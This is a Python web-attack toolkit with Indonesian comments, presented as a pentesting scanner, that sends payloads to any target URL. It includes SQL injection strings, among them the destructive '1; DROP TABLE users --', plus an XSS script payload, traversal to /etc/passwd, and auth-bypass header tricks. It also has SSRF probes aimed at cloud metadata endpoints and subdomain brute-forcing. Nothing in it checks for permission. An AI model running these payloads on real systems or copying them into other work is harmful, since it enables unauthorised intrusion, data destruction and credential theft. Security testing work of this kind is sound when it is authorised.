import requests
import argparse
import sys
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
import os
import time
import json

# Warna untuk terminal
class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

def banner():
    print("")
    print("  ██████╗ ██╗   ██╗███████╗    ███████╗██╗██████╗ ███████╗██████╗")
    print("  ██╔══██╗╚██╗ ██╔╝╚══███╔╝    ██╔════╝██║██╔══██╗██╔════╝██╔══██╗")
    print("  ██████╔╝ ╚████╔╝   ███╔╝     ███████╗██║██████╔╝█████╗  ██████╔╝")
    print("  ██╔══██╗  ╚██╔╝   ███╔╝      ╚════██║██║██╔══██╗██╔══╝  ██╔══██╗")
    print("  ██║  ██║   ██║   ███████╗    ███████║██║██║  ██║███████╗██║  ██║")
    print(f" ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ {bcolors.ENDC}")
    print(f"{bcolors.BOLD}            NoxaXD Pentesting Toolkit v1.0{bcolors.ENDC}")
    print(f"{bcolors.BOLD}     Made to make it easier to find vulnerability{bcolors.ENDC}\n")

def main_menu():
    print(f"{bcolors.OKGREEN}├ Menu Utama:{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 1. SQL Injection Scanner{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 2. XSS Vulnerability Finder{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 3. Authentication Bypass Tester{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 4. Security Headers Checker{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 5. CORS Misconfiguration Checker{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 6. Directory Traversal Tester{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 7. SSRF Vulnerability Tester{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 8. Subdomain Finder{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 9. Full Site Scan{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}├ 10.Generate Report{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}╰ 11. {bcolors.FAIL}Exit{bcolors.ENDC}")
    choice = input("\nPilih opsi (1-11): ")
    return choice

def sql_injection_scan(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memulai SQLi scan pada: {url}")
    
    # Payload SQLi untuk berbagai database
    payloads = [
        "' OR 1=1 --", 
        "\" OR \"a\"=\"a", 
        "' OR SLEEP(5) --",
        "1' UNION SELECT 1,version(),3 --",
        "1; DROP TABLE users --"
    ]
    
    vulnerable = False
    parsed_url = urlparse(url)
    params = {}
    if parsed_url.query:
        params = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}
    
    results = []
    
    for payload in payloads:
        try:
            test_params = params.copy()
            for key in test_params:
                original_value = test_params[key]
                test_params[key] = payload
                
                # Bangun URL baru dengan parameter yang dimodifikasi
                new_query = "&".join(f"{k}={v}" for k, v in test_params.items())
                target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                start_time = time.time()
                response = requests.get(target_url, timeout=15)
                elapsed_time = time.time() - start_time
                
                # Deteksi indikator kerentanan
                indicators = [
                    "mysql_fetch",
                    "syntax error",
                    "unclosed quotation",
                    "SQL syntax",
                    "warning: mysql",
                    "ORA-00933",
                    "PostgreSQL"
                ]
                
                # Deteksi time-based
                if payload.find("SLEEP") != -1 and elapsed_time > 5:
                    print(f"  {bcolors.FAIL}[!] KERENTANAN SQLi (Time-Based) DITEMUKAN!{bcolors.ENDC}")
                    print(f"      Payload: {payload}")
                    print(f"      Parameter: {key}")
                    vulnerable = True
                    results.append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'payload': payload,
                        'parameter': key,
                        'evidence': f"Response delay {elapsed_time:.2f}s"
                    })
                    continue
                
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        print(f"  {bcolors.FAIL}[!] KERENTANAN SQLi DITEMUKAN!{bcolors.ENDC}")
                        print(f"      Payload: {payload}")
                        print(f"      Parameter: {key}")
                        vulnerable = True
                        results.append({
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'payload': payload,
                            'parameter': key,
                            'evidence': f"Found '{indicator}' in response"
                        })
                        break
                
                test_params[key] = original_value  # Kembalikan nilai asli
                    
        except Exception as e:
            print(f"  {bcolors.WARNING}[x] Error: {str(e)}{bcolors.ENDC}")
    
    if not vulnerable:
        print(f"  {bcolors.OKGREEN}[-] Tidak ditemukan kerentanan SQLi{bcolors.ENDC}")
    
    return results

def xss_scan(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memulai XSS scan pada: {url}")
    payload = "<script>alert('XSS_VULN_NoxaXD')</script>"
    vuln_found = False
    results = []
    
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        # Test URL parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param in query_params:
            test_url = url.replace(f"{param}={query_params[param][0]}", f"{param}={payload}")
            res = requests.get(test_url)
            if payload in res.text:
                print(f"  {bcolors.FAIL}[!] KERENTANAN XSS DITEMUKAN di parameter URL!{bcolors.ENDC}")
                print(f"      Parameter: {param}")
                vuln_found = True
                results.append({
                    'type': 'XSS',
                    'severity': 'High',
                    'location': 'URL parameter',
                    'parameter': param,
                    'payload': payload
                })
        
        # Test form inputs
        for form in forms:
            form_details = {}
            action = form.attrs.get('action', '').lower()
            method = form.attrs.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            for input_tag in inputs:
                name = input_tag.attrs.get('name')
                if name:
                    form_details[name] = payload
            
            target_url = urljoin(url, action)
            
            if method == 'post':
                res = requests.post(target_url, data=form_details)
            else:
                res = requests.get(target_url, params=form_details)
            
            if payload in res.text:
                print(f"  {bcolors.FAIL}[!] KERENTANAN XSS DITEMUKAN di form!{bcolors.ENDC}")
                print(f"      Action: {action}")
                print(f"      Method: {method.upper()}")
                vuln_found = True
                results.append({
                    'type': 'XSS',
                    'severity': 'High',
                    'location': 'Form',
                    'action': action,
                    'method': method,
                    'payload': payload
                })
        
        if not vuln_found:
            print(f"  {bcolors.OKGREEN}[-] Tidak ditemukan kerentanan XSS{bcolors.ENDC}")
            
    except Exception as e:
        print(f"  {bcolors.WARNING}[x] Error: {str(e)}{bcolors.ENDC}")
    
    return results

def auth_bypass_test(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memulai Auth Bypass test pada: {url}")
    bypass_found = False
    techniques = [
        ("/admin", "Admin panel tanpa autentikasi"),
        ("/admin/../admin", "Path traversal bypass"),
        ("/admin?bypass=true", "Parameter manipulation"),
        ("/admin", {"X-Original-URL": "/login"}),
        ("/admin", {"X-Rewrite-URL": "/public"}),
        ("/admin", {"X-Forwarded-For": "127.0.0.1"})
    ]
    
    results = []
    
    for endpoint, payload in techniques:
        try:
            test_url = url.rstrip('/') + endpoint
            
            if isinstance(payload, dict):
                response = requests.get(test_url, headers=payload)
                payload_desc = f"Header: {json.dumps(payload)}"
            else:
                response = requests.get(test_url)
                payload_desc = payload
            
            if response.status_code == 200:
                if "admin" in response.text.lower() or "dashboard" in response.text.lower():
                    print(f"  {bcolors.FAIL}[!] BYPASS DITEMUKAN! Teknik: {payload_desc}{bcolors.ENDC}")
                    print(f"      Endpoint: {endpoint}")
                    bypass_found = True
                    results.append({
                        'type': 'Authentication Bypass',
                        'severity': 'Critical',
                        'technique': payload_desc,
                        'endpoint': endpoint,
                        'status_code': response.status_code
                    })
                
        except Exception as e:
            print(f"  {bcolors.WARNING}[x] Error: {str(e)}{bcolors.ENDC}")
    
    if not bypass_found:
        print(f"  {bcolors.OKGREEN}[-] Tidak ditemukan celah bypass autentikasi{bcolors.ENDC}")
    
    return results

def check_security_headers(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memeriksa Security Headers di {url}")
    results = []
    try:
        response = requests.head(url, timeout=10)
        headers = response.headers
        
        security_headers = {
            'X-Frame-Options': 'Mencegah clickjacking',
            'Content-Security-Policy': 'Mencegah XSS dan injeksi',
            'Strict-Transport-Security': 'Enforce HTTPS',
            'X-Content-Type-Options': 'Mencegah MIME-sniffing',
            'Referrer-Policy': 'Kontrol informasi referrer',
            'Permissions-Policy': 'Kontrol fitur browser',
            'X-XSS-Protection': 'Proteksi XSS browser'
        }
        
        missing = []
        for header, desc in security_headers.items():
            if header in headers:
                print(f"  {bcolors.OKGREEN}[✓] {header}: {headers[header]}{bcolors.ENDC}")
                results.append({
                    'type': 'Security Header',
                    'header': header,
                    'status': 'Present',
                    'value': headers[header]
                })
            else:
                print(f"  {bcolors.FAIL}[✗] {header}: MISSING!{bcolors.ENDC}")
                results.append({
                    'type': 'Security Header',
                    'header': header,
                    'status': 'Missing',
                    'value': None
                })
                missing.append(header)
        
        if missing:
            print(f"\n{bcolors.WARNING}[!] PERINGATAN: {len(missing)} security headers hilang!{bcolors.ENDC}")
        else:
            print(f"\n{bcolors.OKGREEN}[✓] Semua security headers terpasang dengan baik{bcolors.ENDC}")
            
    except Exception as e:
        print(f"  {bcolors.WARNING}[x] Error: {str(e)}{bcolors.ENDC}")
    
    return results

def check_cors(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memeriksa CORS Misconfiguration di {url}")
    results = []
    try:
        malicious_origin = "https://attacker-evil.com"
        headers = {'Origin': malicious_origin}
        response = requests.get(url, headers=headers, timeout=10)
        
        if 'Access-Control-Allow-Origin' in response.headers:
            acao = response.headers['Access-Control-Allow-Origin']
            if acao == '*':
                print(f"  {bcolors.FAIL}[!] KRITIS: CORS mengizinkan semua domain (*){bcolors.ENDC}")
                results.append({
                    'type': 'CORS Misconfiguration',
                    'issue': 'CORS allows all domains',
                    'severity': 'High',
                    'header_value': acao
                })
            elif acao == malicious_origin:
                print(f"  {bcolors.FAIL}[!] KRITIS: CORS mengizinkan domain asing: {malicious_origin}{bcolors.ENDC}")
                results.append({
                    'type': 'CORS Misconfiguration',
                    'issue': 'CORS allows arbitrary domain',
                    'severity': 'Critical',
                    'header_value': acao
                })
            else:
                print(f"  {bcolors.OKGREEN}[✓] CORS terkonfigurasi dengan aman{bcolors.ENDC}")
                results.append({
                    'type': 'CORS Check',
                    'issue': 'CORS configured securely',
                    'severity': 'Info',
                    'header_value': acao
                })
        else:
            print(f"  {bcolors.OKGREEN}[✓] Tidak ada CORS header terdeteksi{bcolors.ENDC}")
            results.append({
                'type': 'CORS Check',
                'issue': 'No CORS header detected',
                'severity': 'Info',
                'header_value': None
            })
            
    except Exception as e:
        print(f"  {bcolors.WARNING}[x] Error: {str(e)}{bcolors.ENDC}")
    
    return results

def directory_traversal_test(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memulai Directory Traversal Test pada: {url}")
    payloads = [
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../../windows/win.ini",
        "....//....//....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
    ]
    vulnerable = False
    results = []
    
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    path = parsed_url.path
    
    # Coba di parameter
    if parsed_url.query:
        params = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                new_query = "&".join(f"{k}={v}" for k, v in test_params.items())
                test_url = f"{base_url}{path}?{new_query}"
                try:
                    response = requests.get(test_url)
                    if "root:" in response.text or "[extensions]" in response.text:
                        print(f"  {bcolors.FAIL}[!] Kerentanan Directory Traversal ditemukan!{bcolors.ENDC}")
                        print(f"      Parameter: {param}")
                        print(f"      Payload: {payload}")
                        vulnerable = True
                        results.append({
                            'type': 'Directory Traversal',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Sensitive file content found'
                        })
                        break
                except:
                    pass
    
    # Coba di path
    for payload in payloads:
        test_url = f"{base_url}{path}{payload}"
        try:
            response = requests.get(test_url)
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"  {bcolors.FAIL}[!] Kerentanan Directory Traversal ditemukan di path!{bcolors.ENDC}")
                print(f"      Payload: {payload}")
                vulnerable = True
                results.append({
                    'type': 'Directory Traversal',
                    'severity': 'High',
                    'location': 'URL path',
                    'payload': payload,
                    'evidence': 'Sensitive file content found'
                })
                break
        except:
            pass
    
    if not vulnerable:
        print(f"  {bcolors.OKGREEN}[-] Tidak ditemukan kerentanan Directory Traversal{bcolors.ENDC}")
    
    return results

def ssrf_test(url):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memulai SSRF Test pada: {url}")
    test_servers = [
        "http://169.254.169.254", # AWS metadata
        "http://metadata.google.internal", # GCP metadata
        "http://169.254.169.254/latest/meta-data/", 
        "http://localhost",
        "http://127.0.0.1:22"
    ]
    vulnerable = False
    results = []
    
    parsed_url = urlparse(url)
    params = {}
    if parsed_url.query:
        params = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}
    
    for param in params:
        for server in test_servers:
            test_params = params.copy()
            test_params[param] = server
            new_query = "&".join(f"{k}={v}" for k, v in test_params.items())
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            try:
                response = requests.get(test_url, timeout=5)
                if server in response.text or "EC2" in response.text or "Google" in response.text:
                    print(f"  {bcolors.FAIL}[!] Kerentanan SSRF ditemukan!{bcolors.ENDC}")
                    print(f"      Parameter: {param}")
                    print(f"      Server: {server}")
                    vulnerable = True
                    results.append({
                        'type': 'SSRF',
                        'severity': 'Critical',
                        'parameter': param,
                        'test_server': server,
                        'evidence': 'Internal server response found'
                    })
                    break
            except:
                pass
    
    if not vulnerable:
        print(f"  {bcolors.OKGREEN}[-] Tidak ditemukan kerentanan SSRF{bcolors.ENDC}")
    
    return results

def subdomain_finder(domain):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Memulai Subdomain Enumeration untuk: {domain}")
    subdomains = []
    wordlist = [
        "www", "mail", "ftp", "admin", "webmail", "test", 
        "dev", "staging", "api", "secure", "portal", "cpanel"
    ]
    
    print(f"{bcolors.CYAN}[*] Menggunakan wordlist built-in...{bcolors.ENDC}")
    
    for sub in wordlist:
        test_domain = f"{sub}.{domain}"
        try:
            response = requests.get(f"http://{test_domain}", timeout=5)
            if response.status_code < 400:
                print(f"  {bcolors.OKGREEN}[+] Subdomain ditemukan: {test_domain} (Status: {response.status_code}){bcolors.ENDC}")
                subdomains.append({
                    'type': 'Subdomain',
                    'subdomain': test_domain,
                    'status': response.status_code
                })
            else:
                print(f"  [-] {test_domain} (Status: {response.status_code})")
        except:
            print(f"  [-] {test_domain} (Tidak merespon)")
    
    print(f"{bcolors.CYAN}[*] Mencoba dengan DNS dari file...{bcolors.ENDC}")
    try:
        # Coba baca dari file jika ada
        with open("dns_wordlist.txt", "r") as f:
            dns_list = f.read().splitlines()
            for sub in dns_list:
                test_domain = f"{sub}.{domain}"
                try:
                    response = requests.get(f"http://{test_domain}", timeout=5)
                    if response.status_code < 400:
                        print(f"  {bcolors.OKGREEN}[+] Subdomain ditemukan: {test_domain} (Status: {response.status_code}){bcolors.ENDC}")
                        subdomains.append({
                            'type': 'Subdomain',
                            'subdomain': test_domain,
                            'status': response.status_code
                        })
                except:
                    pass
    except FileNotFoundError:
        print(f"  {bcolors.WARNING}[!] File dns_wordlist.txt tidak ditemukan{bcolors.ENDC}")
    
    return subdomains

def full_scan(url):
    print(f"\n{bcolors.BOLD}{bcolors.BLUE}🚀 Memulai Full Scan di {url}{bcolors.ENDC}")
    all_results = {}
    
    all_results['sql_injection'] = sql_injection_scan(url)
    all_results['xss'] = xss_scan(url)
    all_results['auth_bypass'] = auth_bypass_test(url)
    all_results['security_headers'] = check_security_headers(url)
    all_results['cors'] = check_cors(url)
    all_results['directory_traversal'] = directory_traversal_test(url)
    all_results['ssrf'] = ssrf_test(url)
    
    domain = urlparse(url).netloc
    if domain.startswith("www."):
        domain = domain[4:]
    all_results['subdomains'] = subdomain_finder(domain)
    
    print(f"\n{bcolors.OKGREEN}[✓] Full scan selesai!{bcolors.ENDC}")
    return all_results

def generate_report(results, filename="pentest_report.html"):
    print(f"\n[{bcolors.BLUE}+{bcolors.ENDC}] Membuat laporan: {filename}")
    
    # Hitung temuan kerentanan
    critical_count = 0
    high_count = 0
    medium_count = 0
    info_count = 0
    
    # Hitung kerentanan berdasarkan severity
    for category, vulns in results.items():
        for vuln in vulns:
            severity = vuln.get('severity', '').lower()
            if severity == 'critical':
                critical_count += 1
            elif severity == 'high':
                high_count += 1
            elif severity == 'medium':
                medium_count += 1
            elif severity == 'info':
                info_count += 1
    
    # Buat laporan HTML
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Laporan Pentest - Ryzzi Cyber</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            h1, h2 {{ color: #2c3e50; }}
            .critical {{ color: #e74c3c; font-weight: bold; }}
            .high {{ color: #e67e22; font-weight: bold; }}
            .medium {{ color: #f39c12; }}
            .info {{ color: #3498db; }}
            .vuln-table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
            .vuln-table th, .vuln-table td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            .vuln-table tr:nth-child(even) {{ background-color: #f2f2f2; }}
            .summary {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <h1>Laporan Pentest - Ryzzi Cyber</h1>
        <p>Dibuat pada: {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
        
        <div class="summary">
            <h2>Ringkasan Kerentanan</h2>
            <p><span class="critical">Critical: {critical_count}</span> | 
               <span class="high">High: {high_count}</span> | 
               <span class="medium">Medium: {medium_count}</span> |
               <span class="info">Info: {info_count}</span></p>
        </div>
    """
    
    # Tambahkan hasil per kategori
    for category, vulns in results.items():
        if vulns:
            html += f"<h2>{category.replace('_', ' ').title()}</h2>"
            html += "<table class='vuln-table'>"
            
            # Tentukan header berdasarkan kategori
            if category == 'security_headers':
                html += "<tr><th>Header</th><th>Status</th><th>Value</th></tr>"
            elif category == 'subdomains':
                html += "<tr><th>Subdomain</th><th>Status Code</th></tr>"
            elif category == 'cors':
                html += "<tr><th>Issue</th><th>Severity</th><th>Header Value</th></tr>"
            else:
                html += "<tr><th>Type</th><th>Severity</th><th>Details</th></tr>"
            
            # Isi tabel
            for vuln in vulns:
                html += "<tr>"
                
                if category == 'security_headers':
                    status_class = "info" if vuln['status'] == 'Present' else "high"
                    html += f"<td>{vuln['header']}</td>"
                    html += f"<td class='{status_class}'>{vuln['status']}</td>"
                    html += f"<td>{vuln.get('value', '-')}</td>"
                
                elif category == 'subdomains':
                    html += f"<td>{vuln['subdomain']}</td>"
                    html += f"<td>{vuln['status']}</td>"
                
                elif category == 'cors':
                    severity = vuln.get('severity', 'N/A')
                    html += f"<td>{vuln.get('issue', 'CORS Issue')}</td>"
                    html += f"<td class='{severity.lower()}'>{severity}</td>"
                    html += f"<td>{vuln.get('header_value', '-')}</td>"
                
                else:
                    # Gunakan 'type' jika ada, jika tidak gunakan nama kategori
                    vuln_type = vuln.get('type', category.replace('_', ' ').title())
                    severity = vuln.get('severity', 'N/A')
                    
                    # Kumpulkan semua detail
                    details = []
                    for key, value in vuln.items():
                        if key not in ['type', 'severity']:
                            details.append(f"{key}: {value}")
                    details_html = "<br>".join(details) if details else "-"
                    
                    html += f"<td>{vuln_type}</td>"
                    html += f"<td class='{severity.lower()}'>{severity}</td>"
                    html += f"<td>{details_html}</td>"
                
                html += "</tr>"
            
            html += "</table>"
    
    html += """
    </body>
    </html>
    """
    
    # Simpan ke file
    with open(filename, "w", encoding='utf-8') as f:
        f.write(html)
    
    print(f"  {bcolors.OKGREEN}[✓] Laporan berhasil disimpan: {filename}{bcolors.ENDC}")

if __name__ == "__main__":
    banner()
    
    # Inisialisasi hasil global
    global_results = {}
    
    parser = argparse.ArgumentParser(description='NoxaXD Pentesting Toolkit')
    parser.add_argument('-u', '--url', help='URL target')
    parser.add_argument('-f', '--full', action='store_true', help='Jalankan full scan')
    parser.add_argument('-r', '--report', help='Nama file laporan')
    args = parser.parse_args()
    
    if args.url:
        target_url = args.url
        if args.full:
            global_results = full_scan(target_url)
            report_file = args.report or "pentest_report.html"
            generate_report(global_results, report_file)
            sys.exit()
    else:
        target_url = input("╭Masukkan URL target: ")
    
    while True:
        choice = main_menu()
        
        if choice == '1':
            global_results['sql_injection'] = sql_injection_scan(target_url)
        elif choice == '2':
            global_results['xss'] = xss_scan(target_url)
        elif choice == '3':
            global_results['auth_bypass'] = auth_bypass_test(target_url)
        elif choice == '4':
            global_results['security_headers'] = check_security_headers(target_url)
        elif choice == '5':
            global_results['cors'] = check_cors(target_url)
        elif choice == '6':
            global_results['directory_traversal'] = directory_traversal_test(target_url)
        elif choice == '7':
            global_results['ssrf'] = ssrf_test(target_url)
        elif choice == '8':
            domain = urlparse(target_url).netloc
            if domain.startswith("www."):
                domain = domain[4:]
            global_results['subdomains'] = subdomain_finder(domain)
        elif choice == '9':
            global_results = full_scan(target_url)
        elif choice == '10':
            if global_results:
                report_file = args.report or "pentest_report.html"
                generate_report(global_results, report_file)
            else:
                print(f"{bcolors.WARNING}[!] Belum ada hasil scan untuk dilaporkan!{bcolors.ENDC}")
        elif choice == '11':
            print("Keluar...")
            sys.exit()
        else:
            print(f"{bcolors.FAIL}Pilihan tidak valid!{bcolors.ENDC}")
        
        input("\nTekan Enter untuk melanjutkan...")
